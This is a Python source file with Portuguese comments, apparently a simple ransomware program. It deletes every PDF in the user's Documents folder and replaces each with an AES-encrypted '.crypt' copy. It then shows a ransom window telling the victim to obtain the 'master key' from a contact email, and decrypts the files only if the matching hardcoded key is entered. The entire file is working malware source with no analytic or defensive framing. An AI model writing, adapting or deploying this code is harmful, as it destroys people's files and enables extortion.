import os
import sys
import glob
import time
from PySimpleGUI.PySimpleGUI import timer_start
import pyaes
import PySimpleGUI as sg
from pathlib import Path
from PIL import Image
import requests

# Variável global para listagem dos arquivos
lst_arq = ["*.pdf"]

time.sleep(3)

# Entra no path Desktop e faz a verificação
try:
    desktop = Path.home() / "Documents"
except Exception:
    pass

os.chdir(desktop)


def tela():
        # Seta o tema (cores) da GUI utilizando a biblioteca PySimpleGUI
        sg.change_look_and_feel('DarkBrown4')

        # Transforma uma imagem PNG/JPEG em Base64
        btn_enviar = b'iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAEhElEQVR42sWXbWxTVRjH/13b9b3rXoBONiuDrUwc68hcGIkGRYwSFzCGGI2JRD4sopEZiRD4sC6+RBM/YIKQxcygH/ygMWyZEaISFz/AMhc2GI7srWxuo8Be+3bb0t7Nc057u7a3hXtR8UnOze25Pef/O89zznPOUUCqNdZVk+ceUrbHSybripd2tPZcltKtQoLwbvJ0kuKQDBuzftautafj/gAa62zkeTp5tOZCFfKtudCbVTDkKaFS57D6aGQJAQ8PzhuFdy6ChZuRdK/sIyAT0gFio6biFvqzqESDErsOWr1S0tBDHI+poSBmp8JC1WIcQuQNMUBj3etxcTJSJdY7jGS0KvbJqDJgV+kz2FJQhQrzehTr17B6N3cLw94xXJofwE+Tv8IfDbD6gCeKsX4/8Qwv9E4hvs4OEBt5uzDqRx7TMzdT4f0Vr+Kl0jr4uV9IOY/wnWtYWvaxZjkKEzS5lTDqd5CyEz9M9qBt+FsGQsMzfpVL9saeZE8oksRt8YljoeIbaoysuty0Dh9vaYIq1AZv4IykEJgNLyKq3Y+jl45jxHed1Y32+QUIGg6HMCeSAX6jE466/dFtZjZyJr75WSwufgR+ySdJXDBljgkWyzEcvfIzg6CeGLzgFcLRRQCeWgFIcn3Vk3ks5tTtp2p3wz3/iSxhamoivtbyGsbnT6G44Aje7O1g4aBzYuB3T0ooBIA+6pZk179hK8JapaRckiquNGLrw20waTdi2tOOyzeaMc1X46uJ2fRQ9BOAGkU8w9HYw7HDwpZamS6EhlWLssVzifjT676ERWdP1I0vdKB7qgWdMxa4glq2RPvPJ/p2UIBm8uLMt6phf9zMaveumYNJuSRbvKG8FQW6CtG3kflOdLo+xPe3CtnvwQsekrCi9NWpECafbZMexWU6FKkj2F4gb8JpiPjL9pNYpa/I+P02N4zvhg7gx9s58ERVcLuCmPiTo5+6KMAyfausNyOvSA2bNoyNhlBKB/XFe9E3cxahqF/UuVZlxL7KE7AayjOKuwMjOD34NsK8H6OcBmMkDJ7ZCK5d9LLvCYDa5/ITub2MQFhzY/n8FfsR1K7ehRuko5MDBxGMrEDo1EYcqPocD2URn/aTNlcPIkTazERUcIU04JcVbEn2nltIBdjaUJjS2JjDo6WmCduszyfqJv2j+KyvCRxZUnqyTA/VHEepcUNG8b/i//VGOLjvqOHlU/eR7s65uwMcq34XL5TsFHU84SMdX2nGoc0tsJkyi1/3jaG59z3cDAfh4zNvYCKA5BBYdavxzRMnYFIbIdeGvS680/0+PBEu638yhkCYhILRNPxF/aeyIKj4WxcPJ3bDbJY+CVOWYbLJgZAqTi19GYoSkVwIOeLUhv7wCqcmZ8ZULAdCrrg4FVPLsBlJgZArTk28GcUARNvxvSDuRzz7dhyDEB1IskE0bWrE4d4PZInf/UASA8h4JPu37N5HsrRQJB9K/4lJP5SuQGQ9lss1+cfyVE9QiP/hYrICIbqa0WRlLlQ/gKuZ2BtOPPDLqRjkP7me/w0BLVBvOx6mJwAAAABJRU5ErkJggg=='
        # Transforma uma imagem PNG/JPEG em Base64
        btn_cancelar = b'iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAA7AAAAOwBeShxvQAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAARySURBVFiFtZdLbBNXFIa/Mw8/YmeSpnECxFETCVoEVLzaBRKlEClFaqpKrRQBG5askGgrFbppFqWbsuoeWLBqpVSsaCSEglTES6gLhJIKBAJDjAh2GuLYYHvGM7cLbBOIxxlZ5V957px7/u/OnDm+Vwiou11dVjgSGVEwJCKbgQGgs3p7AUgppW4KXIza9p+Jubl8kLyyUkC6r+99T+QYSu0H2gLyvkDkN4Ff+tPpuy0BzCSTUaXUceAIYAQ0flOOEvnVM4yxwVSqFBhgJplcp5Q6C2xq0fhNXfcM4+uBhw+frAiQWrNmqyZyHkj8T+Y1pUVkpD+dvuULUF35lbdgXodwTfPjwVRqtjag1X48GBiIKKXG36I5QFKvVM7NJJPRZQC64/wMbH6L5i+l1HYPfqhdClQ/NZjGp9pD27cjoRDla9cCeZjr12P09VGcnPQLKbimuW4wlZrVADyRY37mRn8/vWfP0jM+TvuhQyuaR4aG6J2YoPvMGSo7dviFxXXHGQPQ7nZ1WdUm01BeLoc7Pw9A59hYU4jI0BDdp04hoRDKtlm4f59nhYJf+MFsd3e7Fo5ERmjS4bzFRbKjo7jZbB3COnx4ufnu3XSfPFk3v33gAC+mpsgXi34QsWIo9Ln+TXv7ERHZ5rsswJufpzQ5SXRkBC0WI7JzJ9g25Rs3XpmfPo2Ew3Xz+XPn6vPtSgVPKaKh0Gt5RWRe/86yfgT6mgE0g5C2tqbmK0A48qivLwt0rwRQk7l2LYnxcfREtV1UKmAYTc2Xqj0a5Z14HAAFGQ2wgpoDOPfukR0dxcvlXg4YBsp1A5kDr9WEQIe2QnxD6ckkEq03M0TXaduwIfD8pRD6t5Z1hOD/868XnOPg5vNokQidQ0Mo22bxypVAeao1YWvAg5bMbZvb+/dza9cu7KdPAXjv+HGSR48GTUfZcSqaUupmS+bVd168c4ep4eGWIAxNS2kCF1s1r6lVCF3XL0gmkYiXQqFZINYwqLeX1VevvjLft4/5iYmGCds2bmTT+fOY1U90aniY3KVLDWM1TVPvmmaP1pPNFhD53RfT81C2jVcqNTUHeDE9zdTevTiZDMp18cpl39iIYfzzQT4/J1DfCU0DZqNgt6ODf4tFSo8f+yZcKqOzE92yKD961PC+iBCzrE+2ZLOX61uyh8nkCVHqe7+kdqVCJpfD87xAEM0UC4cvbc3nP4UlOyLPMMaA636TQoZBj2WhaS31rroMXS+4hvFl7bqebTCVKrmm+RUw4wthmvR0dLQMoYu4sVhsz0fPnuWWAVQhZkXkCyDtC9Hik9A1zY1Ho6Mfzs39vXS84cHkyapVCUfT/kBkl19C23HILC4GqglT15+H4vGdW7PZZU2v4TJWz85my21tnymRn4DnjWKCvA4RIRoOX1bR6JpG5hDgcPpgYGBVdQN5kAbNqtGT0DVNhQxjWgzj8LaFhb+a5V8RoKZMIhEvmeYIInuALQoGpXo8L1cqzxcKBV0TSRm6fiHmuifWFgqZIHn/A4YN9IH3nt2BAAAAAElFTkSuQmCC'
        # Transforma uma imagem PNG/JPEG em Base64
        img_alerta = b''

        try:
            formatoArquivo
        except NameError:
            sg.Popup('Não foi possível criptografar nenhum arquivo.', title=("Decrypt"), keep_on_top=True, font=("Verdana", 12), text_color="white")
            sys.exit(0)

        # Configuração da GUI
        layout_column = [
            [sg.Button('', image_data=img_alerta, border_width=0)],
            [sg.Text('Seus arquivos pessoais foram criptografados! ', justification="center", size=(60,1), font=("Verdana", 25))],
            [sg.Listbox(values=[formatoArquivo], select_mode='extended', size=(30, 6))],
            [sg.Text('A única maneira de recuperá-los é através de uma chave-mestra, a qual pode ser encontrada em: contato@decrypt.com.br.', text_color='white', justification="center", size=(60,0), font=("Verdana", 12))],
            [sg.Text('Caso já tenha a chave em mãos, digite a mesma para descriptogragar os arquivos: ', text_color='white', justification="center", size=(45,0), font=("Verdana", 10))],
            [sg.Input( key="chave")],
            [sg.Button('', image_data=btn_enviar, border_width=0, key='enviar')],
        ]
        
        layout = [[sg.Column(layout_column, element_justification='center')]]

        janela = sg.Window("Crypt").layout(layout)

        button, values = janela.Read()

        global key        
        key = values["chave"]

# Função para criptografar os arquivos encontrados
def criptografando():
    global formatoArquivo
    for files in lst_arq:
        # Faz a leitura dos arquivos encontrados
        for format_file in glob.glob(files):
            formatoArquivo = format_file
            f = open(f"{desktop}\\{format_file}", "rb")
            file_data = f.read()
            f.close()
            # Insere a criptografia AES no arquivo
            os.remove(f"{desktop}\\{format_file}")
            key = b"1ab2c3e4f5g6h7i8"  # 16 byts key - Chave para descriptografia
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            # Salvando arquivo novo (.crypt)
            new_file = format_file + ".crypt"
            new_file = open(f"{desktop}\\{new_file}", "wb")
            new_file.write(crypto_data)
            new_file.close()

# Função para descriptografar os arquivos encontrados
def descrypt(decrypt_file):
    try:
        #Lista os arquivos .crypt e descriptografa
        for file in glob.glob("*.crypt"):
            keybytes = decrypt_file.encode()
            name_file = open(file, "rb")
            file_data = name_file.read()
            dkey = keybytes  # 16 bytes key
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split(".")
            new_file_name = format_file[0] + "." + format_file[1]  # Remove a extensão crypt do arquivo

            dnew_file = open(f"{desktop}\\{new_file_name}", "wb")
            dnew_file.write(decrypt_data)
            dnew_file.close()
        sg.Popup('Seus arquivos foram descriptografados com sucesso!', title=("Decrypt"), keep_on_top=True, font=("Verdana", 12), text_color="white")
    except ValueError as err:
        print("Chave inválida")
        sys.exit(0)


if __name__ == "__main__":
    criptografando()
    if criptografando:
        tela()
        # Faz a verificação da chave para descriptografar
        if key == "1ab2c3e4f5g6h7i8":
            descrypt(key)
            for del_file in glob.glob("*.crypt"):
                os.remove(f"{desktop}\\{del_file}")
        else:
            sg.Popup('Chave inválida! Verifique novamente os campos.', keep_on_top=True)
